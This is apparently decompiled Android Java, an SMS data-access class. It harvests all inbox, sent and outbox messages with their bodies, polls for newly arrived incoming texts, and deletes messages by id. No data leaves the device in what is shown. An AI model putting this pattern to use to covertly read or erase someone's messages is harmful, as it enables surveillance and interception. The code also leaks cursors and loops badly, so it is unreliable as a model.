package iits.code.dao;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import iits.code.dto.SMS_DTO;
import iits.mamager.FileManager;
import java.util.ArrayList;

public class SMS_History_DAO {
    private static final int INCOMING = 1;
    private static final int MESSAGE_TYPE_DRAFT = 3;
    private static final int MESSAGE_TYPE_FAILED = 5;
    private static final int MESSAGE_TYPE_INBOX = 1;
    private static final int MESSAGE_TYPE_QUEUED = 6;
    private static final int MESSAGE_TYPE_SENT = 2;
    private static final int OUTGOING = 0;
    private static final String TAG = "SMS_History_DAO";

    public static ArrayList<SMS_DTO> getAlls(ContentResolver cr) {
        try {
            ArrayList<SMS_DTO> arrSMS = new ArrayList<>();
            Cursor c = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null);
            while (c.moveToNext()) {
                SMS_DTO sms = new SMS_DTO();
                sms.setID(c.getLong(c.getColumnIndex("_id")));
                sms.setTime(c.getLong(c.getColumnIndex("date")));
                sms.setNumber(c.getString(c.getColumnIndex("address")));
                sms.setDirection(1);
                sms.setMessage(c.getString(c.getColumnIndex("body")));
                arrSMS.add(sms);
            }
            Cursor c2 = cr.query(Uri.parse("content://sms/sent"), null, null, null, null);
            while (c2.moveToNext()) {
                SMS_DTO sms2 = new SMS_DTO();
                sms2.setID(c2.getLong(c2.getColumnIndex("_id")));
                sms2.setTime(c2.getLong(c2.getColumnIndex("date")));
                sms2.setNumber(c2.getString(c2.getColumnIndex("address")));
                sms2.setDirection(0);
                sms2.setMessage(c2.getString(c2.getColumnIndex("body")));
                arrSMS.add(sms2);
            }
            Cursor c3 = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null);
            while (c3.moveToNext()) {
                SMS_DTO sms3 = new SMS_DTO();
                sms3.setID(c3.getLong(c3.getColumnIndex("_id")));
                sms3.setTime(c3.getLong(c3.getColumnIndex("date")));
                sms3.setNumber(c3.getString(c3.getColumnIndex("address")));
                sms3.setDirection(0);
                sms3.setMessage(c3.getString(c3.getColumnIndex("body")));
                arrSMS.add(sms3);
            }
            c3.close();
            return arrSMS;
        } catch (Exception e) {
            Log.e(TAG, "Error on getAlls function: " + e.toString());
            return null;
        }
    }

    public static int getSMSSentCount(ContentResolver cr) {
        try {
            Cursor c = cr.query(Uri.parse("content://sms/sent"), null, null, null, null);
            int count = 0;
            while (c.moveToNext()) {
                count++;
            }
            c.close();
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getHistory function: " + e.toString());
            return 0;
        }
    }

    public static SMS_DTO getSMSSentLast(ContentResolver cr) {
        Exception e;
        SMS_DTO sms = null;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/sent"), null, null, null, "_id DESC");
            if (c.moveToNext()) {
                SMS_DTO sms2 = new SMS_DTO();
                try {
                    sms2.setID(c.getLong(c.getColumnIndex("_id")));
                    sms2.setTime(c.getLong(c.getColumnIndex("date")));
                    sms2.setNumber(c.getString(c.getColumnIndex("address")));
                    sms2.setDirection(0);
                    sms2.setMessage(c.getString(c.getColumnIndex("body")));
                    sms = sms2;
                } catch (Exception e2) {
                    e = e2;
                    Log.e(TAG, "Error on getSMSSentLast function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return sms;
        } catch (Exception e3) {
            e = e3;
            Log.e(TAG, "Error on getSMSSentLast function: " + e.toString());
            return null;
        }
    }

    public static SMS_DTO getSMSOutBoxLast(ContentResolver cr) {
        Exception e;
        SMS_DTO sms = null;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/outbox"), null, null, null, "_id DESC");
            if (c.moveToNext()) {
                SMS_DTO sms2 = new SMS_DTO();
                try {
                    sms2.setID(c.getLong(c.getColumnIndex("_id")));
                    sms2.setTime(c.getLong(c.getColumnIndex("date")));
                    sms2.setNumber(c.getString(c.getColumnIndex("address")));
                    sms2.setDirection(0);
                    sms2.setMessage(c.getString(c.getColumnIndex("body")));
                    sms = sms2;
                } catch (Exception e2) {
                    e = e2;
                    Log.e(TAG, "Error on getSMSSentLast function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return sms;
        } catch (Exception e3) {
            e = e3;
            Log.e(TAG, "Error on getSMSSentLast function: " + e.toString());
            return null;
        }
    }

    public static int getSMSReceiverCount(ContentResolver cr) {
        try {
            Cursor c = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int count = 0;
            while (c.moveToNext()) {
                count++;
            }
            c.close();
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getSMSReceiverCount function: " + e.toString());
            return 0;
        }
    }

    public static SMS_DTO getSMSReceiverLast(ContentResolver cr) {
        Exception e;
        SMS_DTO sms = null;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "_id DESC");
            if (c.moveToNext()) {
                SMS_DTO sms2 = new SMS_DTO();
                try {
                    sms2.setID(c.getLong(c.getColumnIndex("_id")));
                    sms2.setTime(c.getLong(c.getColumnIndex("date")));
                    sms2.setNumber(c.getString(c.getColumnIndex("address")));
                    sms2.setDirection(1);
                    sms2.setMessage(c.getString(c.getColumnIndex("body")));
                    sms = sms2;
                } catch (Exception e2) {
                    e = e2;
                    Log.e(TAG, "Error on getSMSReceiverLast function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return sms;
        } catch (Exception e3) {
            e = e3;
            Log.e(TAG, "Error on getSMSReceiverLast function: " + e.toString());
            return null;
        }
    }

    public static int getCount(ContentResolver cr) {
        int count = 0;
        try {
            while (cr.query(Uri.parse("content://sms/inbox"), null, null, null, null).moveToNext()) {
                count++;
            }
            while (cr.query(Uri.parse("content://sms/sent"), null, null, null, null).moveToNext()) {
                count++;
            }
            Cursor c = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null);
            while (c.moveToNext()) {
                count++;
            }
            c.close();
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getCount function: " + e.toString());
            return -1;
        }
    }

    public static int getThreadCount(ContentResolver cr) {
        int count = 0;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/"), null, null, null, null);
            while (c.moveToNext()) {
                count++;
            }
            c.close();
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getThreadCount function: " + e.toString());
            return -1;
        }
    }

    public static long getLastID(ContentResolver cr) {
        long id = 0;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/"), null, null, null, "_id DESC");
            if (c.moveToNext()) {
                id = c.getLong(c.getColumnIndex("_id"));
            }
            c.close();
            return id;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
            return 0;
        }
    }

    public static SMS_DTO getLastSMS(ContentResolver cr) {
        Exception e;
        SMS_DTO sms = null;
        try {
            Cursor c = cr.query(Uri.parse("content://sms/"), null, null, null, "_id DESC");
            if (c.moveToNext()) {
                SMS_DTO sms2 = new SMS_DTO();
                try {
                    int type = c.getInt(c.getColumnIndex("type"));
                    sms2.setID(c.getLong(c.getColumnIndex("_id")));
                    sms2.setTime(c.getLong(c.getColumnIndex("date")));
                    sms2.setNumber(c.getString(c.getColumnIndex("address")));
                    if (type == 1) {
                        sms2.setDirection(1);
                    } else {
                        sms2.setDirection(0);
                    }
                    sms2.setMessage(c.getString(c.getColumnIndex("body")));
                    sms = sms2;
                } catch (Exception e2) {
                    e = e2;
                    FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return sms;
        } catch (Exception e3) {
            e = e3;
            FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
            return null;
        }
    }

    /* JADX INFO: Multiple debug info for r19v2 long: [D('time' long), D('systemTime' long)] */
    /* JADX INFO: Multiple debug info for r16v7 android.database.Cursor: [D('cr' android.content.ContentResolver), D('c' android.database.Cursor)] */
    /* JADX INFO: Multiple debug info for r16v13 iits.code.dto.SMS_DTO: [D('sms' iits.code.dto.SMS_DTO), D('cr' android.content.ContentResolver)] */
    /* JADX INFO: Multiple debug info for r16v15 iits.code.dto.SMS_DTO: [D('sms' iits.code.dto.SMS_DTO), D('cr' android.content.ContentResolver)] */
    public static SMS_DTO getSMSNew(ContentResolver cr, long id, long time) {
        try {
            Cursor c = cr.query(Uri.parse("content://sms/"), null, null, null, "_id DESC");
            if (!c.moveToNext() || c.getLong(c.getColumnIndex("_id")) <= id) {
                Cursor c2 = cr.query(Uri.parse("content://sms/"), null, "date > ?", new String[]{String.valueOf(time)}, "date");
                if (c2.moveToNext()) {
                    SMS_DTO sms = new SMS_DTO();
                    int type = c2.getInt(c2.getColumnIndex("type"));
                    if (type == 2 || type == 3 || type == 5 || type == 6) {
                        return null;
                    }
                    sms.setID(c2.getLong(c2.getColumnIndex("_id")));
                    sms.setTime(c2.getLong(c2.getColumnIndex("date")));
                    sms.setNumber(c2.getString(c2.getColumnIndex("address")));
                    if (type == 1) {
                        sms.setDirection(1);
                    } else {
                        sms.setDirection(0);
                    }
                    sms.setMessage(c2.getString(c2.getColumnIndex("body")));
                    return sms;
                }
                long systemTime = System.currentTimeMillis();
                Cursor c3 = cr.query(Uri.parse("content://sms/"), null, "date < ?", new String[]{String.valueOf(systemTime)}, "date DESC");
                if (c3.moveToNext()) {
                    long date = c3.getLong(c3.getColumnIndex("date"));
                    if (systemTime - date < 5000) {
                        SMS_DTO sms2 = new SMS_DTO();
                        try {
                            int type2 = c3.getInt(c3.getColumnIndex("type"));
                            if (type2 == 2 || type2 == 3 || type2 == 5 || type2 == 6) {
                                return null;
                            }
                            sms2.setID(c3.getLong(c3.getColumnIndex("_id")));
                            sms2.setTime(date);
                            sms2.setNumber(c3.getString(c3.getColumnIndex("address")));
                            if (type2 == 1) {
                                sms2.setDirection(1);
                            } else {
                                sms2.setDirection(0);
                            }
                            sms2.setMessage(c3.getString(c3.getColumnIndex("body")));
                            return sms2;
                        } catch (Exception e) {
                            e = e;
                            FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
                            return null;
                        }
                    }
                }
                c3.close();
                return null;
            }
            SMS_DTO sms3 = new SMS_DTO();
            try {
                int type3 = c.getInt(c.getColumnIndex("type"));
                if (type3 == 2 || type3 == 3 || type3 == 5 || type3 == 6) {
                    return null;
                }
                sms3.setID(c.getLong(c.getColumnIndex("_id")));
                sms3.setTime(c.getLong(c.getColumnIndex("date")));
                sms3.setNumber(c.getString(c.getColumnIndex("address")));
                if (type3 == 1) {
                    sms3.setDirection(1);
                } else {
                    sms3.setDirection(0);
                }
                sms3.setMessage(c.getString(c.getColumnIndex("body")));
                return sms3;
            } catch (Exception e2) {
                e = e2;
                FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
                return null;
            }
        } catch (Exception e3) {
            e = e3;
            FileManager.WriteLog(3, TAG, "Error on getLastID function: " + e.toString());
            return null;
        }
    }

    public static boolean delete(ContentResolver cr, long id) {
        try {
            if (cr.delete(Uri.parse("content://sms/"), "_id = '" + id + "'", null) == 0) {
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error on delete function: " + e.toString());
            return false;
        }
    }
}
